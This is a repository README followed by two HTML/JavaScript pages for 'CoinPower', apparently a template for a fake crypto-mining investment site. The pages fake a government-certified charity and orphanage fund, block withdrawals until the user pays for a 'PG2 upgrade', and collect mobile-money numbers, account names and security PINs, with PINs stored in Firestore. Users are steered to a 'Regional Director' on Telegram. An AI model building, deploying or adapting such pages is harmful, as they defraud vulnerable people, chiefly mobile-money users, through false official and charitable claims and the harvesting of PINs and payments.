# Coinpower-

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CoinPower | Italian Storage Group</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>

    <style>
        :root {
            --dark: #001a33;
            --gold: #d4af37;
            --light: #f4f7f6;
        }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: var(--light); color: var(--dark); }
        .card { background: white; margin: 15px; padding: 20px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        
        /* TICKER STYLES */
        .ticker-wrap { background: var(--dark); color: white; border-bottom: 2px solid var(--gold); overflow: hidden; white-space: nowrap; padding: 10px 0; }
        .ticker-move { display: inline-block; padding-left: 100%; animation: ticker-scroll 30s linear infinite; }
        @keyframes ticker-scroll { from { transform: translateX(0); } to { transform: translateX(-100%); } }
        .ticker-move:hover { animation-play-state: paused; }

        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
    </style>
</head>
<body>

    <div class="ticker-wrap">
        <div class="ticker-move">
            <span style="color: var(--gold); font-weight: bold; margin-right: 20px;">🏛️ OFFICIAL DIRECTIVE:</span>
            <span>CoinPower Italy confirms **Permanent Regional Activation**. Systems and Government-Certified Charity Protocols are anchored indefinitely. Moving our community from poverty to success... 🌍 Local Orphanage Funds Secured... 📜 OFFICE OF THE REGIONAL DIRECTOR IS OPEN.</span>
        </div>
    </div>

    <div class="card" style="background: linear-gradient(135deg, #001a33, #003366); color: white; text-align: center;">
        <h2 style="margin: 0; letter-spacing: 2px;">COINPOWER 🇮🇹</h2>
        <p style="font-size: 0.8em; opacity: 0.8;">Regional Office: Authorized Storage & Charity Infrastructure</p>
    </div>

    <div class="card">
        <h4 style="margin-top:0; color:#d9534f;">📤 Request Payout</h4>
        <p style="font-size: 0.75em; color: #666;">A 15% Charity & Maintenance fee is settled with Government-Certified accounts upon withdrawal.</p>
        
        <select id="w-network" onchange="document.getElementById('w-phone').placeholder = this.value + ' Number'">
            <option value="MTN MoMo">🟡 MTN Mobile Money</option>
            <option value="Telecel">🔴 Telecel Cash</option>
            <option value="AT Tigo">🔵 AT (AirtelTigo) Money</option>
        </select>
        <input type="text" id="w-name" placeholder="Registered Account Name">
        <input type="number" id="w-phone" placeholder="MoMo Number">
        <input type="number" id="w-amt" placeholder="Amount ($)">
        <input type="password" id="w-pin" placeholder="Security PIN">
        <button class="btn" style="background: var(--dark); color: white;" onclick="handleWithdraw()">Request Payout</button>
    </div>

    <div class="card">
        <h4 style="border-bottom: 2px solid var(--gold); display: inline-block;">📜 System Mission</h4>
        <p style="font-size: 0.85em; line-height: 1.6;">
            <b>The Path to Success:</b> PG1 is a trial phase. Your referral is your reference. To move from poverty to success, upgrade to PG2 to unlock the global withdrawal gateway.
        </p>
        <p style="font-size: 0.85em; line-height: 1.6; background: #fdfae6; padding: 10px; border-radius: 8px;">
            <b>Orphanage Fund:</b> Pursuant to our International Certificate, 15% of all processing is transferred to <b>Government-Managed Social Welfare Accounts</b> in your country to support children who have lost their parents.
        </p>
    </div>

    <div class="card" style="border: 1px solid #ddd; text-align: center;">
        <p style="font-size: 0.8em; margin-bottom: 10px;">For VIP Upgrades or Certification Inquiries:</p>
        <button class="btn" style="background: #0088cc; color: white;" onclick="window.open('https://t.me/your_telegram_link', '_blank')">
            CONTACT REGIONAL DIRECTOR
        </button>
    </div>

    <script>
        // --- FIREBASE CONFIG ---
        const firebaseConfig = { /* PASTE YOUR CONFIG HERE */ };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // --- WITHDRAWAL LOGIC ---
        async function handleWithdraw() {
            // Placeholder user data - replace with your 'currentUser' logic
            const userPlan = "PG1"; 
            
            if(userPlan === "PG1") {
                alert("🔒 ACCESS DENIED: PG1 is a Trial Level. Please upgrade to PG2 using your gift bonus or referral rewards to move from poverty to success!");
                return;
            }

            const amt = parseFloat(document.getElementById('w-amt').value);
            const fee = amt * 0.15;
            const net = amt - fee;

            const confirmMsg = `Withdrawal Summary:\nGross: $${amt}\nOrphanage Fund (15%): $${fee.toFixed(2)}\nYou Receive: $${net.toFixed(2)}\n\nProceed?`;
            
            if(confirm(confirmMsg)) {
                alert("Request Sent to the Regional Director's Office for Government settlement.");
                // Add your Firebase DB update logic here
            }
        }
    </script>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CoinPower | Secure Mining</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>
    <style>
        :root { --gold: #b8860b; --p-green: #28a745; --dark: #1a1a1a; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding-bottom: 80px; background: #fff; color: #333; }
        .container { max-width: 450px; margin: auto; padding: 20px; }
        .hidden { display: none !important; }
        .auth-header { text-align: center; padding: 40px 20px; }
        .logo-large { width: 140px; height: 140px; border-radius: 50%; box-shadow: 0 8px 20px rgba(0,0,0,0.15); object-fit: cover; }
        .dash-header { background: linear-gradient(135deg, #111 0%, #333 100%); color: white; padding: 25px; border-radius: 0 0 25px 25px; text-align: center; }
        .logo-small { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--gold); }
        .card { background: white; border: 1px solid #eee; border-radius: 18px; padding: 20px; margin: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .btn { background: var(--p-green); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
        .timer-label { color: #d9534f; font-weight: bold; font-size: 0.85em; margin-top: 8px; text-align: center; }
    </style>
</head>
<body>
    <div id="auth-page">
        <div class="auth-header">
            <img src="3611.jpg" class="logo-large">
            <h2 style="color: var(--gold);">DIGITAL ENERGY MINING</h2>
        </div>
        <div class="container">
            <div id="reg-box" class="card">
                <input type="text" id="reg-user" placeholder="Username">
                <select id="reg-country">
                    <option value="">Select Country</option>
                    <option>Italy 🇮🇹</option><option>Canada 🇨🇦</option><option>USA 🇺🇸</option>
                    <option>UK 🇬🇧</option><option>Ghana 🇬🇭</option><option>Nigeria 🇳🇬</option>
                </select>
                <input type="text" id="reg-phone" placeholder="Phone Number">
                <input type="password" id="reg-pin" maxlength="4" placeholder="4-Digit PIN">
                <button class="btn" onclick="register()">Join Now</button>
            </div>
        </div>
    </div>

    <div id="main-page" class="hidden">
        <div class="dash-header">
            <img src="3611.jpg" class="logo-small">
            <h1 id="display-balance" style="color: #ffc107;">$0.00</h1>
        </div>
        <div class="container">
            <div id="bonus-card" class="card hidden" style="border: 2px solid #ffc107; text-align: center;">
                <h3>🎁 Bonus!</h3>
                <button class="btn" style="background:#ffc107; color:#000;" onclick="claimSpecial()">Claim $<span id="bonus-amt-text">0</span></button>
            </div>
            <div class="card" style="text-align:center;">
                <h3>PG1 Global Unit</h3>
                <button id="btn-claim-pg" class="btn" onclick="claimDaily()">Claim $1.00</button>
                <div id="timer-text" class="timer-label"></div>
            </div>
            <button class="btn" style="background:#25D366" onclick="window.open('https://wa.me/YOURNUMBER')">💬 Support</button>
        </div>
    </div>

    <script>
        // Use your same Firebase Config here
        const firebaseConfig = { /* PASTE YOUR CONFIG */ };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null;

        async function register() {
            const phone = document.getElementById('reg-phone').value.trim();
            user = { username: document.getElementById('reg-user').value, phone: phone, country: document.getElementById('reg-country').value, pin: document.getElementById('reg-pin').value, balance: 1.0, lastClaim: 0, pendingBonus: 0 };
            await db.collection("users").doc(phone).set(user);
            showDashboard();
        }

        async function login() {
            /* standard login logic */
        }

        async function claimDaily() {
            if(Date.now() - user.lastClaim < 86400000) return;
            user.balance += 1.0; user.lastClaim = Date.now();
            await db.collection("users").doc(user.phone).set(user); updateUI();
        }

        async function claimSpecial() {
            user.balance += user.pendingBonus; user.pendingBonus = 0;
            await db.collection("users").doc(user.phone).set(user); updateUI();
        }

        function showDashboard() { 
            document.getElementById('auth-page').classList.add('hidden'); 
            document.getElementById('main-page').classList.remove('hidden'); 
            updateUI(); startTimer();
        }

        function updateUI() {
            document.getElementById('display-balance').innerText = "$" + user.balance.toFixed(2);
            if(user.pendingBonus > 0) {
                document.getElementById('bonus-card').classList.remove('hidden');
                document.getElementById('bonus-amt-text').innerText = user.pendingBonus;
            } else { document.getElementById('bonus-card').classList.add('hidden'); }
        }

        function startTimer() {
            setInterval(() => {
                const diff = 86400000 - (Date.now() - user.lastClaim);
                document.getElementById('timer-text').innerText = diff > 0 ? "Mining..." : "Ready!";
                document.getElementById('btn-claim-pg').disabled = diff > 0;
            }, 1000);
        }
    </script>
</body>
</html>
